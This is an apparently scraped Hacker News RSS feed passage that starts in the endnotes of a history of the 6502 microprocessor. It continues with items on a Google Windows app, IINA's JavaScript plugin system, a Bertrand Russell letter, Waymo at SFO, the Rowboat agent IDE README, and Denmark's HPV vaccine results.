Mensch, and Orgill The 1975 EDN article[4] quotes Peddle, Orgill, and Mathys on various aspects of the design, for example: “Internally, quite a few changes have occured in the 650X family chips, according to Rod Orgill and Will Mathys of the design team.” Bill Mensch[51] responded to a question I had about whether Peddle had made any progress at Motorola on a low-cost design: “He wasn’t a semiconductor engineer. He could have played around with some instruction sets. That said I think he relied on Rod and possibly Wil for actually completing what became the 6502 ISA.” Wil Mathys states[8] he was primarily responsible for translation of the ISA into sequences of data transfers for each instruction in state diagrams, conversion to equations, and a preliminary logic diagram. According to Bawcom[21], “Wil Mathys and Chuck worked out the computer ‘architecture,’ probably the most important part of the project and something I know nothing about.” Peddle’s oral history[1 page 29] describes some last-minute work he did with Wil Mathys to make the 6502 just a tiny bit smaller: “And he and I sat down and we said, OK, we’re going to make the number, and we’re going to not give up any instructions. So we actually had to adjust the addressing modes and timing so that we would make the chip that wide.” In the end, there is ambiguity. I’m going to go with Bagnall’s statement since Mensch excludes himself from working on the ISA, but I wouldn’t be surprised if Mensch helped a bit. Aside from this note about the ISA, I am not going to try to split hairs with the roles each of the 6502 team played in this important project. The technology development process is the more important takeaway of this section, rather than the people involved. [8] Wil Mathys, A Little History Lesson, published on team6502.org, Jun 6 2022. [9] Greg James, Barry Silverman, and Brian Silverman, 650X Schematic Notes, from their website visual6502.org, circa 2011. This copy of the schematic has a colorful history: In 1979, as part of a project funded by the University of Mississippi, Dr. Donald F. Hanson contacted several microprocessor manufacturers, including MOS Technology, to find out more about their design and operation. MOS Technology invited him to visit, and then provided him a copy of the logic diagram blueprints, allowing him to publish high-level details for educational purposes. He analyzed them and later published a block diagram of the 6502 in 1995. Jason Scott interviewed Dr. Hanson in June 2013, where he retold the story of how he obtained the blueprint copy, and some other technical areas of interest. This interview was part of a documentary on the 6502 that Scott was working on at the time; unfortunately the documentary was not completed, but Scott posted his materials onto the Internet Archive. According to these notes on visual6502.org, the title block of page 1, including registers and buses, is dated 11/74, and page 2, including the instruction decoder, is dated 8-12-75. Both pages list “ORGILL, MENSCH” under engineering approval. Bill Mensch remembers that he and Rod Orgill worked on this logic diagram. Wil Mathys also remembers drawing a logic diagram,[8] which may have been a different logic diagram at a more abstract level, or may have been a preliminary version of this diagram. He mentions “The transistor sizes would have been put on by Bill and Rod as a result of their circuit analysis.”[50] [10] Stephen Edwards and Bill Mensch, Genesis and Evolution of the 6502 Family, Vintage Computer Festival West, Aug 8 2021. The oscillator story starts at 25:50. [11] Bill Mensch, personal communication, Jun 16 2022. [12] Stephen Diamond (interviewer), Oral History of William David “Bill” Mensch, Jr., Computer History Museum, November 10, 2014. [13] Motorola, MOS Technology settle patent suit, Electronics, Apr 1 1976. [14] Bill Mensch, personal communication to clarify schematic questions, May 15 2022. [15] Paul D. Q. Campbell, Basic Fixture Design, 1994. [16] Bill Mensch, personal communication, May 19 2022. [17] Jason Scott, photographs of portions of Hanson copy of the 650X-C Microprocessor Logic Diagram (Donald F Hanson, Dept. of Elec. Engr., Univ. of Mississippi, University, MS 38677), as part of Donald F Hanson interview, 2013. Scott provided me permission to reproduce his photographs for this article. As far as the logic diagram goes, I don’t know whether a detailed image of it, in its entirety, will ever be made public, even though this copy of the logic diagram blueprint has outlived MOS and Commodore Semiconductor Group and its successor GMT Microelectronics by over 20 years. [18] Bill Mensch, personal communication to clarify yet another set of schematic questions, May 22 2022. [19] Bill Mensch, personal communication, May 6 2022. [20] Harry Bawcom, interviewed by Brian Stuart for Vintage Computer Festival, 2020. [21] Harry Bawcom, personal communication, May 18 and May 19 2022. [22] Gardner Hendrie, Oral History of Joel Karp, Computer History Museum, Mar 3 2003. [23] Cara McCarty, Information Art: Diagramming Microchips, The Museum of Modern Art, 1990. What a neat read! MoMA made the story of integrated circuit production into an art exhibit, giving not only an interesting visual presentation, but also a fairly good descriptive overview of some of the design and fabrication processes, including several microprocessors up to the Intel 486. [24] The Bill Mensch 6502 Story, Bill Mensch, Mensch Foundation website, 2020. [25] The Engineering Design Revolution (at https://www.cadhistory.net), David E. Weisberg, 2008. [26] Albert Charpentier discusses the VIC chip and the design of the Commodore C64 w/Bil Herd Ben Jordan on YouTube, Mar 4 2022. This is a fun video to watch. Charpentier worked as a chip designer at MOS/Commodore from 1974 to 1982, originally on some of the calculator chips and ROMs, but then went on to design the VIC and VIC-II chips used in the VIC-20, Commodore 64, and Commodore 128. [27] MOS Technology brochure, July or August 1975. [28] Terry Holdt, Tab #2: Hand carry spec notes for 019-H, Holdt Archives on team6502.org, circa spring 1975. Step 14 mentions lot 019-H and that “The value of this step is questionable and was eliminated on 3/25/75.” Step 10a mentions the following sequence of operations; my emphasis: Step 10a ALIGN – Masks other than source-drain [29] Albert Charpentier, personal communication, Jun 18 2022: I started at MOS Technology in the summer of 1974. At that time calculator chips were the highest volume product at MOS Technology. Contact printing was still being used on three inch wafers. They were moving to 4 inch wafers and the Perkin Elmer machines were being readied from production. The non-contact printing capability was a great innovation and improved yield and help set the stage for Chuck Peddle and the Motorola crew to create the 6502 with a ground breaking price point. Mensch remembers proximity masks while working on the 6502 design at MOS.[12] The big question is, when was the switch to projection aligner for the 6502? [30] Perkin-Elmer Micralign: The Near Impossibility of Making a Microchip, Daniel P. Burbank, American Heritage Invention &amp;amp; Technology Magazine, Fall 1999. [31] 1975 Motorola Annual Report, March 1976, page 10: [32] Oral History Panel on the Development and Promotion of the Motorola 68000, Computer History Museum, July 23, 2007. Bill Walker mentions yield issues on several occasions, including on page 10: [33] Micralign Projection Mask Alignment Systems brochure, Perkin-Elmer, September 1978. [34] Rob Walker, Interview with William Mensch, part of the project “Silicon Genesis : oral history interviews of Silicon Valley scientists, 1995-2018”, Stanford University, Oct 9 1995. Transcript also available in Internet Archive. [35] 1969 Motorola Annual Report, Mar 26 1970. [36] 1971 Motorola Annual Report, Mar 20 1972. [37] Electronics Magazine, Apr 12 1971. [38] 1972 Motorola Annual Report, Mar 20 1973. [39] 1973 Motorola Annual Report, Mar 25 1974. [40] Motorola advertisement, Electronic Design, Dec 6 1970, page 115. [41] Jack Ward, A Transistor Museum Interview with Jack Haenichen, Nov 15 2006. [42] I had originally gone into more detail about some of the internal politics at Motorola around the time of the 6800, but it added too much of a tangent, so I’m collecting the information here in a note instead. A 1979 Chicago Tribune article reflected on Motorola’s track record in the 1970s, citing improvement in a number of areas, notably in its management, as well as internal conflicts, that had hampered its ability to stay competitive in the early 1970s:[52] The failure to get designs into production was particularly frustrating, and stemmed from a classic split between the research-and-design people and production people. “They just didn’t want to talk to each other,” Motorola’s [William G.] Howard recalls. Meanwhile, friction — usually good-natured but not always — was developing between IC people and discrete employees, who frequently reminded the IC people that they — the discretes — were paying the bills. The early 1970s coincided with a management gap, between the 1968 departure of top semiconductor executive C. Lester Hogan and seven other executives to Fairchild Semiconductor, and the 1975 reorganization appointing John Welty.[53] The post-Hogan years were cited in a 1973 legal opinion dismissing Motorola’s lawsuit against Fairchild, stating that “Motorola profited and Fairchild Camera lost by the events complained of which resulted in a change of the style of Division management from an autocratic one [under Hogan] to a more democratic style under Mr. Levy.”[54] But a “democratic” organization has its pitfalls, and some cracks developed, perhaps due to a hands-off management style. Welty hired Al Stein from Texas Instruments to become Vice President of Motorola’s integrated circuit operations; Stein felt that management “was also chaotic, in contrast to T.I.’s careful attention to setting goals and giving managers the responsibility of meeting them. ‘I thought everybody did it like T.I. did till I got to Motorola.’ ”[55] John Ekiss, who became the MOS group operations manager at Motorola in early 1974,[56] was interviewed in 2008 with several other 6800 team leads, and mentioned that he was certain the departure of Hogan’s group of eight executives “was a portion of the problems caused by the lack of senior management who had the maturity to manage the kinds of things that were going on at that time.”[43] In that interview, Ekiss made this statement about the 6800 project:[43] Well, I think one thing I learned, and it stuck with me for a long time, is when the conditions are right, when the iron needs to be struck, and if you make the right decisions, and if you have very talented people who can overcome the technical barriers, and make the right inventions, and decisions at a point in time, you can be very, very successful. There’s a lot of “if”s there. All these factors have to align, and unless there’s an incredible stroke of luck, they don’t just align themselves; they need to be cultivated with good leadership. Around the time of the 6800 project, both Mensch and Bawcom ran into a lack of merit recognition for their efforts. Mensch was promised rewards on two occasions — neither of which were given — if his chip designs worked right the first time, once as a bonus, and once as a bet that his 6820 Peripheral Interface Adapter chip would work the first time. The stakes: a dinner at a nice restaurant in Scottsdale.[12] My chip came out and worked. Well, why did it work? We didn’t have LVS [layout vs. schematic]. What I did was I checked it five times. You make a bet, you better back it up. I wasn’t wanting to buy him a \$100 bottle of wine anyway. Well, he never paid off. So when somebody doesn’t pay off, then you go is this the right place for me? Bawcom had a similar experience finishing the 6800 layout, pulling off a marathon layout session around the Christmas holidays in 1973, with one other layout designer, just in time for CEO Bob Galvin’s visit to see when the chip would be ready. Bawcom had been working very late hours and caught up on sleep… by the time he got into the office, Galvin had left and no one gave Bawcom credit for his efforts.[20] Aside from the management slights, Mensch describes working at Motorola’s semiconductor division in a way that I would describe as a good work-life balance;[19][57] Doug Domke, who worked in the discrete semiconductor division, uses the term “comfortable”[58]. But Peddle and Mensch and Bawcom weren’t looking for a “comfortable” environment; they were striving for excellence, in an environment that wasn’t fully utilizing and rewarding their energies. [43] David Laws, Oral History Panel on the Development and Promotion of the Motorola 6800 Microprocessor, Computer History Museum, Mar 28 2008. [44] Chuck Peddle: Creator of the affordable, EDN, Oct 27 1988. [45] The lore promoted by Chuck Peddle himself is that Motorola sent him a formal letter, and this magically unlocked a door for him to go pursue the 6502 elsewhere:[1] And I got a formal letter saying you have to stop work on your low-cost microprocessor. And I wrote a letter back to Motorola and said, that’s called project abandonment. So all of the work I’ve done up until now belongs to me, and I will not do anymore development work for you. I’ll go out and do classes for you, but I won’t do any more development work for. I’m going to go do it for myself. This is echoed in a number of accounts[49] that always seem to trace back to Peddle. This story seems apocryphal. If there were such a letter, why wouldn’t Peddle have kept it and published a copy somewhere, as a way of thumbing his nose at Motorola? He had over four decades to do so after leaving. There is a short article on Peddle in EDN’s October 27, 1988 issue on microprocessors, and the tone Peddle uses there is more humble, not mentioning any letter:[44] So Peddle did what to him was the logical thing: He looked for ways to make the chip cheaper. “I would ask potential customers what they would give up out of the 6800 if I was going to give them a cost-reduced version. It turned out that most everybody had the same set of things they would give up.” Wind of what he was up to got back to the brass at Motorola, of course. Not everybody liked the idea of producing a cheap microprocessor. “Some guys at Motorola who still wanted to be in the minicomputer business went around and said I should be stopped from doing what I was doing. So I went out looking for somebody who wanted to pursue it,” Peddle says. He found MOS Technology. I wonder if he had just received a verbal warning from management, and over the decades, it gradually turned into an exaggerated story. [46] Stephen Cass, Q&amp;amp;A With Co-Creator of the 6502 Processor, IEEE Spectrum, September 16, 2021. [47] MOS Technology ad, Electronics, Aug 7 1975, pages 60 and 61. [48] Steve Wozniak, iWoz, 2006. Beware that Woz’s account has some inaccuracies (6502 instead of the 6501, June 1975 instead of September 1975 for the WESCON show, etc.) [49] Brian Bagnall, On the Edge: The Spectacular Rise and Fall of Commodore, Variant Press, 2006. Also beware of inaccuracies… but it’s quite a compelling story to read. [50] Wil Mathys, personal communication, Jun 7 2022. [51] Bill Mensch, personal communication, May 29 2022. [52] Joseph Winski, Motorola makes remarkable strides in semiconductors, Chicago Tribune, Aug 26 1979. [53] Larry Waller, Motorola seeks to end skid, Electronics, Nov 13 1975. [54] William Copple, Motorola, Inc. v. Fairchild Camera and Instrument, Opinion for United States District Court for the District of Arizona, Mar 13 1973. [55] Andrew Pollack, No. 2 Motorola Closes the Gap, New York Times, Apr 13 1982. [56] Motorola’s 3-year MOS effort is beginning to pay off, Electronics, Apr 4 1974, page 44. [57] Bill Mensch, personal communication, May 10 2022. [58] Doug Domke, A Brief History of Digital Electronics, 2019. A combination of semiconductor history and the author’s personal history while at Motorola. [59] Nicholas Valéry, Coming of Age in the Calculator Business, New Scientist, Nov 13 1975. [60] Calculator maker integrates downwards, New Scientist, Sep 9 1976.&lt;quote&gt;Other major factors were start-up costs resulting from moving the MOS operation from Phoenix, Arizona to Austin, Texas and the additional investments required to solve NMOS yield problems. Even in light of the bad economy, we elected to make these investments to improve our NMOS position. These decisions negatively impacted short-term performance but should improve longer-term profitability.&lt;/quote&gt;&lt;quote&gt; In the mid to late 70’s, Motorola had two 3 inch factories (later upgraded to 4 inch), one for NMOS and the other CMOS. Our manufacturing practices were pretty bad back then, low yields, long cycle times and poor productivity.&lt;/quote&gt;&lt;/p&gt;&lt;head rend="h3"&gt;Further Reading on Digital IC Design and the 6502&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Robert W. Hon and Carlo H. Sequin, A Guide to LSI Implementation, Second Edition, Xerox PARC, 1980.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Carver Mead and Lynn Conway, Introduction to VLSI Systems, Addison-Wesley, 1980.&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Jennifer Holdt Winograd, Team 6502 website (team6502.org) — this is an amazing source of information about the small engineering team at MOS Technology that developed the 6502. Terry Holdt, who was the process engineer and product manager for the 6502, was Winograd’s father, and had numerous documents on the development of the fabrication process used for the 6502, many of which have been published on the site, along with other accounts from several first-hand sources.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Acknowledgements&lt;/head&gt;This article would not be possible without the assistance and encouragement of the following people: Harry Bawcom, Antoine Bercovici, Albert Charpentier, Steve Emery, Bil Herd, Brant Ivey, Wil Mathys, John McMaster, Bill Mensch, Jason Scott, Ken Shirriff, and Jennifer Winograd.&lt;p&gt;© 2022 Jason M. Sachs, all rights reserved.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45263221</guid><pubDate>Tue, 16 Sep 2025 14:59:47 +0000</pubDate></item><item><title>A new experimental Google app for Windows</title><link>https://blog.google/products/search/google-app-windows-labs/</link><description>&lt;doc fingerprint="59ea9b23e3b72fc2"&gt;
  &lt;main&gt;
    &lt;p&gt;Today, we’re launching a new experimental Google app for Windows in Labs to help you find what you need, faster.&lt;/p&gt;
    &lt;p&gt;Now you can search without switching windows or interrupting your flow. Whether you're writing in a doc or in the middle of a game, just press Alt + Space to instantly search for information from your computer files, installed apps, Google Drive files — and of course, the web.&lt;/p&gt;
    &lt;p&gt;With Google Lens built in, you can select and search anything on your screen, making it easy to translate images or text, get help with homework problems and more. You can also get deeper AI-powered responses in AI Mode and keep exploring with follow-up questions and helpful links.&lt;/p&gt;
    &lt;p&gt;Try it for yourself by opting into the experiment in Labs.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45263317</guid><pubDate>Tue, 16 Sep 2025 15:05:46 +0000</pubDate></item><item><title>Plugin System</title><link>https://iina.io/plugins/</link><description>&lt;doc fingerprint="f0ec3c5b09ddb6d2"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Plugin System&lt;/head&gt;
    &lt;p&gt;The plugin system allows you to extend IINA's functionality with JavaScript. You can control the playback, call the mpv API, access the network and file system, adding custom UI elements, and more. The plugin system is available in IINA 1.4.0.&lt;/p&gt;
    &lt;head rend="h4"&gt;Concise API, powerful features&lt;/head&gt;
    &lt;p&gt;With several lines of code, you can implement the exact feature tailored to your needs. Furthermore, with the Official User Scripts plugin, you can just copy-and-paste code snippets into IINA without writing plugin packages.&lt;/p&gt;
    &lt;quote&gt;const { core, event, overlay } = iina;&lt;lb/&gt;event.on("iina.file-loaded", () =&amp;gt; {&lt;lb/&gt;overlay.simpleMode();&lt;lb/&gt;overlay.setContent(`&amp;lt;p&amp;gt;${core.status.title}&amp;lt;/p&amp;gt;`);&lt;lb/&gt;overlay.setStyle(`p { font-size: 48px; }`);&lt;lb/&gt;overlay.show();&lt;lb/&gt;})&lt;/quote&gt;
    &lt;p&gt;Display the video title in a large font on the top of the video&lt;/p&gt;
    &lt;quote&gt;const { core, event } = iina;&lt;lb/&gt;event.on("mpv.pause.changed", () =&amp;gt; {&lt;lb/&gt;core.window.miniaturized = core.status.paused;&lt;lb/&gt;});&lt;lb/&gt;event.on("iina.window-deminiaturized", () =&amp;gt; {&lt;lb/&gt;core.resume();&lt;lb/&gt;});&lt;/quote&gt;
    &lt;p&gt;Minimize the window when the video is paused, and resume when restored&lt;/p&gt;
    &lt;head rend="h4"&gt;What you can do with the plugin system&lt;/head&gt;
    &lt;p&gt;Core&lt;/p&gt;
    &lt;p&gt;Control the playback and get/set various status from the window frame to subtitle tracks.&lt;/p&gt;
    &lt;p&gt;MPV&lt;/p&gt;
    &lt;p&gt;Access the mpv API with properties and hooks for advanced playback control.&lt;/p&gt;
    &lt;p&gt;Event&lt;/p&gt;
    &lt;p&gt;Register and remove listeners for IINA and mpv events.&lt;/p&gt;
    &lt;p&gt;HTTP&lt;/p&gt;
    &lt;p&gt;Make HTTP and XMLRPC requests.&lt;/p&gt;
    &lt;p&gt;Playlist&lt;/p&gt;
    &lt;p&gt;Control the playlist and add custom playlist context menu items.&lt;/p&gt;
    &lt;p&gt;Subtitle&lt;/p&gt;
    &lt;p&gt;Register custom subtitle downloaders that integrates with IINA's user interface.&lt;/p&gt;
    &lt;p&gt;Menu&lt;/p&gt;
    &lt;p&gt;Add menu items with keyboard shortcuts under the Plugin menu.&lt;/p&gt;
    &lt;p&gt;Overlay&lt;/p&gt;
    &lt;p&gt;Render custom webview-based content on the top of videos.&lt;/p&gt;
    &lt;p&gt;Sidebar View&lt;/p&gt;
    &lt;p&gt;Add a tab in the sidebar with custom webview-based contents.&lt;/p&gt;
    &lt;p&gt;Standalone Window&lt;/p&gt;
    &lt;p&gt;Display a webview-based standalone window for complicated user interface.&lt;/p&gt;
    &lt;p&gt;Global Controller&lt;/p&gt;
    &lt;p&gt;Spawn and control multiple player instances.&lt;/p&gt;
    &lt;p&gt;File&lt;/p&gt;
    &lt;p&gt;Access the user file system or read/write sandboxed temporary files and data files.&lt;/p&gt;
    &lt;p&gt;Preferences&lt;/p&gt;
    &lt;p&gt;Store preferences and display a settings page in IINA's preferences panel.&lt;/p&gt;
    &lt;p&gt;Utils&lt;/p&gt;
    &lt;p&gt;Display system dialogs and run custom executables.&lt;/p&gt;
    &lt;p&gt;Console&lt;/p&gt;
    &lt;p&gt;Print logs for debugging, viewable from IINA's log viewer.&lt;/p&gt;
    &lt;head rend="h4"&gt;Start building your plugin&lt;/head&gt;
    &lt;p&gt;An &lt;code&gt;iina-plugin&lt;/code&gt; command line tool is included with the IINA installation to help you create, build, and run plugins.
We have also prepared a complete documentation with tutorials and API references.&lt;/p&gt;
    &lt;p&gt;at docs.iina.io&lt;/p&gt;
    &lt;p&gt;You may also find these resources helpful:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Official User Scripts plugin: simply enter &lt;code&gt;iina/iina-plugin-userscript&lt;/code&gt;when installing.&lt;/item&gt;
      &lt;item&gt;TypeScript definitions: TypeScript definitions for the plugin API. It is included automatically when you create a new plugin with the &lt;code&gt;iina-plugin&lt;/code&gt;command line tool.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45264190</guid><pubDate>Tue, 16 Sep 2025 16:10:44 +0000</pubDate></item><item><title>Bertrand Russell to Oswald Mosley (1962)</title><link>https://lettersofnote.com/2016/02/02/every-ounce-of-my-energy/</link><description>&lt;doc fingerprint="13ab5aceef327fdf"&gt;
  &lt;main&gt;
    &lt;p&gt;Bertrand Russell, one of the great intellectuals of his generation, was known by most as the founder of analytic philosophy, but he was actually a man of many talents: a pioneering mathematician, an accomplished logician, a tireless activist, a respected historian, and a Nobel Prize-winning writer, to name but a handful. When he wrote this principled letter at the beginning of 1962, Russell was 89 years old and clearly still a man of morals who stood firm in his beliefs. Its recipient was Sir Oswald Mosley, a man most famous for founding, in 1932, the British Union of Fascists.&lt;/p&gt;
    &lt;p&gt;Transcript follows.&lt;/p&gt;
    &lt;p&gt;(Sign up for the free Letters of Note newsletter to receive these letters in your inbox. This particular letter can also be found in the bestselling book, More Letters of Note.)&lt;/p&gt;
    &lt;p&gt;22 January 1962&lt;/p&gt;
    &lt;p&gt;Sir Oswald Mosley,&lt;lb/&gt;5, Lowndes Court,&lt;lb/&gt;Lowndes Square,&lt;lb/&gt;London, S.W.1.&lt;/p&gt;
    &lt;p&gt;Dear Sir Oswald,&lt;/p&gt;
    &lt;p&gt;Thank you for your letter and for your enclosures. I have given some thought to our recent correspondence. It is always difficult to decide on how to respond to people whose ethos is so alien and, in fact, repellent to one’s own. It is not that I take exception to the general points made by you but that every ounce of my energy has been devoted to an active opposition to cruel bigotry, compulsive violence, and the sadistic persecution which has characterised the philosophy and practice of fascism.&lt;/p&gt;
    &lt;p&gt;I feel obliged to say that the emotional universes we inhabit are so distinct, and in deepest ways opposed, that nothing fruitful or sincere could ever emerge from association between us.&lt;/p&gt;
    &lt;p&gt;I should like you to understand the intensity of this conviction on my part. It is not out of any attempt to be rude that I say this but because of all that I value in human experience and human achievement.&lt;/p&gt;
    &lt;p&gt;Yours sincerely,&lt;/p&gt;
    &lt;p&gt;Bertrand Russell&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45264340</guid><pubDate>Tue, 16 Sep 2025 16:22:40 +0000</pubDate></item><item><title>Waymo has received our pilot permit allowing for commercial operations at SFO</title><link>https://waymo.com/blog/#short-all-systems-go-at-sfo-waymo-has-received-our-pilot-permit</link><description>&lt;doc fingerprint="db87b0168e9549f1"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;All systems go at SFO! Waymo has received our pilot permit allowing for commercial operations at San Francisco International Airport.&lt;/p&gt;
      &lt;p&gt;We’ll partner with SFO to prepare our operations at the airport in phases, beginning with employee testing soon ahead of welcoming Bay Area riders. Pickups and dropoffs will initially start at SFO’s Kiss &amp;amp; Fly area – a short AirTrain ride from the terminals – with the intention to explore other locations at the airport in the future.&lt;/p&gt;
      &lt;p&gt;This is a major milestone that strengthens Waymo’s impact on the region and offers residents and visitors an innovative way to travel. With years of experience serving riders at Phoenix Sky Harbor (PHX) and operations beginning soon at San Jose Mineta International Airport (SJC), we’re accelerating our efforts to serve more airports in more cities as we scale.&lt;/p&gt;
      &lt;p&gt;“Across San Francisco, we are expanding safe, reliable, and modern transportation options—supporting our city’s economic comeback, boosting our tourism industry, and connecting residents and visitors to everything our city has to offer,” said Mayor Lurie. “We announced in March that we wanted visitors to be able to ride in a Waymo as soon as they arrived in San Francisco, and today, we are taking another important step to get there.”&lt;/p&gt;
      &lt;p&gt;“Bringing the Waymo experience to San Francisco International Airport is about more than just a ride—it’s about providing a safe, reliable, magical way for Bay Area residents and global visitors to connect with the places and people that matter most,” said Tekedra Mawakana, co-CEO, Waymo. “We’re grateful for the partnership with SFO and the vision of Mayor Lurie in making this a reality.”&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45264562</guid><pubDate>Tue, 16 Sep 2025 16:38:08 +0000</pubDate></item><item><title>Scammed out of $130K via fake Google call, spoofed Google email and auth sync</title><link>https://bewildered.substack.com/p/i-was-scammed-out-of-130000-and-google</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45264726</guid><pubDate>Tue, 16 Sep 2025 16:50:42 +0000</pubDate></item><item><title>Launch HN: Rowboat (YC S24) – Open-source IDE for multi-agent systems</title><link>https://github.com/rowboatlabs/rowboat</link><description>&lt;doc fingerprint="9cd53c59514fa0b8"&gt;
  &lt;main&gt;
    &lt;p&gt; ⚡ Build AI agents instantly with natural language | 🔌 Connect tools with one-click integrations | 📂 Power with knowledge by adding documents for RAG | 🔄 Automate workflows by setting up triggers and actions | 🚀 Deploy anywhere via API or SDK&lt;lb/&gt; ☁️ Prefer a hosted version? Use our cloud to starting building agents right away! &lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Set your OpenAI key&lt;/p&gt;
        &lt;code&gt;export OPENAI_API_KEY=your-openai-api-key&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Clone the repository and start Rowboat (requires Docker)&lt;/p&gt;
        &lt;code&gt;git clone git@github.com:rowboatlabs/rowboat.git cd rowboat ./start.sh&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Access the app at http://localhost:3000.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To add tools, RAG, more LLMs, and triggers checkout the Advanced section below.&lt;/p&gt;
    &lt;p&gt;Chat with the copilot to build a meeting-prep workflow, then add a calendar invite as a trigger. Watch the full demo here.&lt;/p&gt;
    &lt;p&gt;Chat with the copilot to build a customer support assistant, then connect your MCP server, and data for RAG. Watch the full demo here.&lt;/p&gt;
    &lt;p&gt;Chat with the copilot to build a personal assistant. Watch the full demo here.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Native RAG Support: Enable file uploads and URL scraping with Rowboat's built-in RAG capabilities – see RAG Guide.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Custom LLM Providers: Use any LLM provider, including aggregators like OpenRouter and LiteLLM - see Using more LLM providers.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tools &amp;amp; Triggers: Add tools and event triggers (e.g., Gmail, Slack) for automation – see Tools &amp;amp; Triggers.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;API &amp;amp; SDK: Integrate Rowboat agents directly into your app – see API &amp;amp; SDK docs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Refer to Docs to learn how to start building agents with Rowboat.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45264867</guid><pubDate>Tue, 16 Sep 2025 17:01:16 +0000</pubDate></item><item><title>The Linux Process Journey (2023) [pdf]</title><link>https://thelearningjourneyebooks.com/wp-content/uploads/2023/09/TheLinuxProcessJourney_v6_Sep2023.pdf</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45265610</guid><pubDate>Tue, 16 Sep 2025 18:01:42 +0000</pubDate></item><item><title>Denmark close to wiping out cancer-causing HPV strains after vaccine roll-out</title><link>https://www.gavi.org/vaccineswork/denmark-close-wiping-out-leading-cancer-causing-hpv-strains-after-vaccine-roll-out</link><description>&lt;doc fingerprint="2714216008bd02a0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Denmark close to wiping out leading cancer-causing HPV strains after vaccine roll-out&lt;/head&gt;
    &lt;p&gt;A nationwide study suggests infections with human papillomavirus (HPV) types 16 and 18 have been virtually eliminated since vaccination began in 2008 – protecting even unvaccinated women.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2 September 2025&lt;/item&gt;
      &lt;item&gt;3 min read&lt;/item&gt;
      &lt;item&gt;by Linda Geddes&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Denmark has effectively eliminated infections with the two biggest cancer-causing strains of human papillomavirus (HPV) since the vaccine was introduced in 2008, data suggests.&lt;/p&gt;
    &lt;p&gt;The research, published in Eurosurveillance, could have implications for how vaccinated populations are screened in the coming years – particularly as people increasingly receive vaccines that protect against multiple high-risk types of HPV virus.&lt;/p&gt;
    &lt;head rend="h3"&gt;Deadly cancer&lt;/head&gt;
    &lt;p&gt;After breast cancer, cervical cancer is the most common type of cancer among women aged 15 to 44 years in Europe, and human papillomavirus (HPV) is the leading cause.&lt;/p&gt;
    &lt;p&gt;At least 14 high-risk types of the virus have been identified, and before Denmark introduced the HPV vaccine in 2008, HPV types 16 and 18 accounted for around three quarters (74%) of cervical cancers in the country.&lt;/p&gt;
    &lt;p&gt;Initially, girls were offered a vaccine that protected against four types of HPV: 16, 18, plus the lower risk types 6 and 11. However, since 2017, Danish girls have been offered a vaccine that protects against nine types of HPV – including those accounting for approximately 90% of cervical cancers.&lt;/p&gt;
    &lt;head rend="h4"&gt;Have you read?&lt;/head&gt;
    &lt;p&gt;To better understand the impact that these vaccination programmes have had on HPV prevalence as vaccinated girls reach cervical screening age (23 to 64 years in Denmark), Dr Mette Hartmann Nonboe at Zealand University Hospital in Nykøbing Falster and colleagues analysed up to three consecutive cervical cell samples collected from Danish women between 2017 and 2024, when they were 22 to 30 years of age.&lt;/p&gt;
    &lt;p&gt;“In 2017, one of the first birth cohorts of women in Denmark who were HPV-vaccinated as teenage girls in 2008 reached the screening age of 23 years,” Nonboe explained.&lt;/p&gt;
    &lt;p&gt;“Compared with previous generations, these women are expected to have a considerably lower risk of cervical cancer, and it is pertinent to assess [their] future need for screening.”&lt;/p&gt;
    &lt;head rend="h3"&gt;High-risk HPV elimination&lt;/head&gt;
    &lt;p&gt;The research found that infection with the high-risk HPV types (HPV16/18) covered by the vaccine has been almost eliminated.&lt;/p&gt;
    &lt;p&gt;“Before vaccination, the prevalence of HPV16/18 was between 15 and 17%, which has decreased in vaccinated women to less than one percent by 2021,” the researchers said.&lt;/p&gt;
    &lt;p&gt;In addition, prevalence of HPV types 16 and 18 in women who had not been vaccinated against HPV was five percent. This strongly suggests that the vaccine has reduced the circulation of these HPV types in general population, to the extent that even unvaccinated women are now less likely to be infected with them – so called “population immunity” – the researchers said.&lt;/p&gt;
